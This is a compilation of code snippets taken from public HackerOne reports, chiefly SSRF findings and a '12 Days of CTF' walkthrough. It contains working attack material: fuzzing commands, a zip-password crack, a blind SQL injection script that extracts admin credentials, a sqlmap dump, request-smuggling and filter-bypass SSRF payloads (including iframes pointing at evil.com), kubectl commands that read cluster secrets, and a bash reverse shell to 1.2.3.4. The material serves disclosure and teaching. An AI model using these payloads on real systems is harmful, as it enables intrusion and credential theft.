## 166. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ffuf -w common-api-endpoints-mazen160.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -fc 404 -mc all

sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

## 167. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ffuf -w burp-parameter-names.txt -u https://hackyholidays.h1ctf.com/swag-shop/api/user\?FUZZ\=1 -fc 400 -mc all

uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
```

## 168. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ unzip my_secure_files_not_for_you.zip 
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password:
```

## 169. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ fcrackzip -b -D -p rockyou.txt -u my_secure_files_not_for_you.zip

PASSWORD FOUND!!!!: pw == hahahaha
```

## 170. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ffuf -w raft-small-files.txt -u https://hackyholidays.h1ctf.com/my-diary/\?template\=FUZZ -fc 302 -mc all

index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
.                       [Status: 200, Size: 0, Words: 1, Lines: 1]
_index.php              [Status: 200, Size: 689, Words: 126, Lines: 22]
```

## 171. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ -fc 404 -mc all
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
```

## 172. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/forum/FUZZ

1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
```

## 173. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ./script.py TABLE_NAME
Result: 'a%'
Result: 'ad%'
Result: 'adm%'
Result: 'admi%'
Result: 'admin%'
```

## 174. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```bash
$ ./script.py USERNAME  
Result: 'a%'
Result: 'ad%'
Result: 'adm%'
Result: 'admi%'
Result: 'admin%'

./script.py PASSWORD
Result: 'S3creT_%'
Result: 'S3creT_p%'
Result: 'S3creT_p4%'
Result: 'S3creT_p4s%'
Result: 'S3creT_p4ss%'
Result: 'S3creT_p4ssw%'
Result: 'S3creT_p4ssw0%'
Result: 'S3creT_p4ssw0r%'
Result: 'S3creT_p4ssw0rd%'
Result: 'S3creT_p4ssw0rd-%'
Result: 'S3creT_p4ssw0rd-$%'
```

## 175. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```bash
$ sqlmap -u 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42' --threads=5 --dump

Database: recon
Table: photo
[6 entries]
+----------+------+--------------------------------------+
| album_id | id   | photo                                |
+----------+------+--------------------------------------+
| 1        | 1    | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 1        | 2    | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 2        | 3    | 32febb19572b12435a6a390c08e8d3da.jpg |
| 3        | 4    | db507bdb186d33a719eb045603020cec.jpg |
| 3        | 5    | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 3        | 6    | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----------+------+--------------------------------------+

Database: recon
Table: album
[3 entries]
+------+--------+-----------+
| id   | hash   | name      |
+------+--------+-----------+
| 1    | 3dir42 | Xmas 2018 |
| 2    | 59grop | Xmas 2019 |
| 3    | jdh34k | Xmas 2020 |
+------+--------+-----------+
```

## 176. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ffuf -w raft-small-words.txt -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -fc 404 -mc all

uploads                 [Status: 403, Size: 145, Words: 3, Lines: 7]
api                     [Status: 200, Size: 2390, Words: 888, Lines: 54]
picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
```

## 177. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Mon, 28 Dec 2020 20:49:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 29

Invalid content type detected
```

## 178. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```python
#!/usr/bin/env python3
import hashlib

TARGET_HASH = '5f2940d65ca4140cc18d0878bc398955'
IP = '203.0.113.33'

with open('../../../SecLists/Passwords/Leaked-Databases/rockyou.txt', errors="ignore") as salt_file:
    salts = [x.strip() for x in salt_file]
    found = False
    for i, salt in enumerate(salts):
        if i % 100 == 0:
            print(f"{round((i/len(salts) * 100), 1)}%", end="\r")

        if hashlib.md5((salt + IP).encode('utf-8')).hexdigest() == TARGET_HASH:
            print("Format is MD5(salt + IP)")
            found = True
        elif hashlib.md5((IP + salt).encode('utf-8')).hexdigest() == TARGET_HASH:
            print("Format is MD5(IP + salt")
            found = True
        if found:
            print(f"Salt is '{salt}'")
            break
```

## 179. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```sh
$ ./exploit.py
Format is MD5(salt + IP)
Salt is 'mrgrinch463'
```

## 180. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
Getting Host Information for: 203.0.113.33
```

## 181. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
Getting Host Information for: 127.0.0.1
```

## 182. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```http
Getting Host Information for: 7f000001.c0a80001.rbndr.us
```

## 183. [#826361](https://hackerone.com/reports/826361)  -  SSRF on project import via the remote_attachment_url on a Note
*high, $10,000*

```ruby
def file
          if @file.blank?
            headers = @remote_headers.
              reverse_merge('User-Agent' => "CarrierWave/#{CarrierWave::VERSION}")

            @file = Kernel.open(@uri.to_s, headers)
            @file = @file.is_a?(String) ? StringIO.new(@file) : @file
          end
```

## 184. [#776017](https://hackerone.com/reports/776017)  -  Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service.
*high, $5,000*

```
http://172.31.X.1:10255/healthz? HTTP/1.1\r\nConnection: keep-
alive\r\nHost: 172.31.X.1:10255\r\nContent-Length: 1\r\n\r\n1\r\nGET /pods? HTTP/1.1\r\nHost: 172.31.X.1:10255\r\n\r\n
```

## 185. [#541169](https://hackerone.com/reports/541169)  -  GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery
*high*

```sh
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
$ dig +noall +answer gitlabextssrf.webhooks.pw
gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
```

## 186. [#541169](https://hackerone.com/reports/541169)  -  GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery
*high*

```sh
$ ./wfuzz -X POST \
  -b "_gitlab_session=<session_id>;" \
  -d "_method=post&authenticity_token=<token>" \
  -z range,0-1000 \
  "https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ"
```

## 187. [#3634400](https://hackerone.com/reports/3634400)  -  SSRF Filter Bypass via Unblocked NAT64 Local-Use IPv6 Prefix (64:ff9b:1::/48)
*high*

```bash
TIPSEN:~:% docker exec ssrf_filter_lab_netadmin sh -lc 'ruby -rsocket -e "s=TCPSocket.new(\"64:ff9b:1::7f00:1\",18081); s.write(\"GET / HTTP/1.0\r\nHost: x\r\n\r\n\"); puts s.read; s.close"'
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 24
Connection: close

NAT64_PREFIX_BYPASS_DEMO
```

## 188. [#1068433](https://hackerone.com/reports/1068433)  -  12 Days of CTF Walkthroughs
*critical*

```python
#!/usr/bin/env python3

import requests
import re
import sys

ENDPOINT = 'https://hackyholidays.h1ctf.com/evil-quiz/'
LOWERCASE = 'abcdefghijklmnopqrstuvwxyz'
ALL_CHARS = LOWERCASE + 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890' + '-$_'
table_name_exploit = "union select table_schema, table_name, 1, 1 from information_schema.tables where table_name like binary "
username_exploit = "union select 1, 2, 3, 4 from admin where username like binary "
password_exploit = "union select 1, 2, 3, 4 from admin where password like binary "
cookie = ''

def process(exploit, charset=LOWERCASE):
    accumulator = ''
    while True:
        for char in charset:
            if run_exploit(exploit + f"'{accumulator}{char}%'"):
                accumulator += char
                break
        print(f"Result: '{accumulator}%'")

def run_exploit(exploit):
    payload = build_payload(exploit)
    name = requests.post(ENDPOINT, cookies=cookie, data = {'name': payload})
    start = requests.post(ENDPOINT + 'start', cookies=cookie, data = {'ques_1': 0, 'ques_2': 0, 'ques_3': 0})
    score = requests.get(ENDPOINT + 'score', cookies=cookie)
    
    success = int(re.search("There is ([0-9]+) other player\(s\) with the same name as you!", str(score.content)).groups()[0]) > 0
    return success

def build_payload(exploit):
    return "testerbtgsg54g45' " + exploit + "-- "

# … truncated …
```

## 189. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get pods --all-namespaces

NAMESPACE                                   NAME                                                              READY     STATUS             RESTARTS   AGE
████████                    ██████████                    1/1
```

## 190. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml

pod "shell-demo" created
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo

pod "shell-demo" deleted
```

## 191. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash

Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
```

## 192. [#341876](https://hackerone.com/reports/341876)  -  SSRF in Exchange leads to ROOT access in all instances
*medium*

```bash
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml

apiVersion: v1
data:
  ca.crt: ██████████
  namespace: ████
  token: ██████████==
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: default
    kubernetes.io/service-account.uid: ████
  creationTimestamp: 2017-01-23T16:08:19Z
  name:█████
  namespace: ██████████
  resourceVersion: "115481155"
  selfLink: /api/v1/namespaces/████████/secrets/████
  uid: █████████
type: kubernetes.io/service-account-token
```

## 193. [#809248](https://hackerone.com/reports/809248)  -  SSRF into Shared Runner, by replacing dockerd with malicious server in Executor
*medium*

```
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

## 194. [#738553](https://hackerone.com/reports/738553)  -  SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX
*medium*

```
Content-Length: 0
```

## 195. [#738553](https://hackerone.com/reports/738553)  -  SSRF in /cabinet/stripeapi/v1/siteInfoLookup?url=XXX
*medium*

```
Content-Length: 114 (>0)
```

## 196. [#1553841](https://hackerone.com/reports/1553841)  -  CVE-2022-27780: percent-encoded path separator in URL host
*medium*

```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
        <head>
                <title>400 - Bad Request</title>
        </head>
        <body>
                <h1>400 - Bad Request</h1>
        </body>
</html>
```

## 197. [#1115139](https://hackerone.com/reports/1115139)  -  Bypassing HTML filter in "Packing Slip Template" Lead to SSRF to Internal Kubernetes Endpoints
*low*

```
<iframe src="https://evil.com/" width=1001 height=1001>
```

## 198. [#1115139](https://hackerone.com/reports/1115139)  -  Bypassing HTML filter in "Packing Slip Template" Lead to SSRF to Internal Kubernetes Endpoints
*low*

```xml
<svg><style><h1/><iframe src="https://evil.com/" width=1001 height=1001>
```

## 199. [#1115139](https://hackerone.com/reports/1115139)  -  Bypassing HTML filter in "Packing Slip Template" Lead to SSRF to Internal Kubernetes Endpoints
*low*

```xml
<svg><style><h1/><iframe src="https://kubernetes.default.svc/info" width=1001 height=1001>
```

## 200. [#1115139](https://hackerone.com/reports/1115139)  -  Bypassing HTML filter in "Packing Slip Template" Lead to SSRF to Internal Kubernetes Endpoints
*low*

```xml
<svg><style><h1/><iframe src="https://kubernetes.default.svc/livez?verbose" width=1001 height=1001>
```

## 201. [#287496](https://hackerone.com/reports/287496)  -  Internal Ports Scanning via Blind SSRF  (URL Redirection to beat filter)
*low*

```
HTTP/1.1 200 OK
Date: Sun, 05 Nov 2017 02:42:03 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Server: nginx
Vary: Accept-Encoding
X-DNS-Prefetch-Control: off
Strict-Transport-Security: max-age=31536000
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer
X-Frame-Options: SAMEORIGIN
ETag: W/"fd-LAmakEWFfBZbQhSwn4nbeuTsy48"
X-Infogram-Server: b201
X-Infogram-Proxy: us
Content-Length: 253

[{"title":"Create Infographics, Charts and Maps - Infogram","description":"Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.","url":"http://0:6000/"}]
```
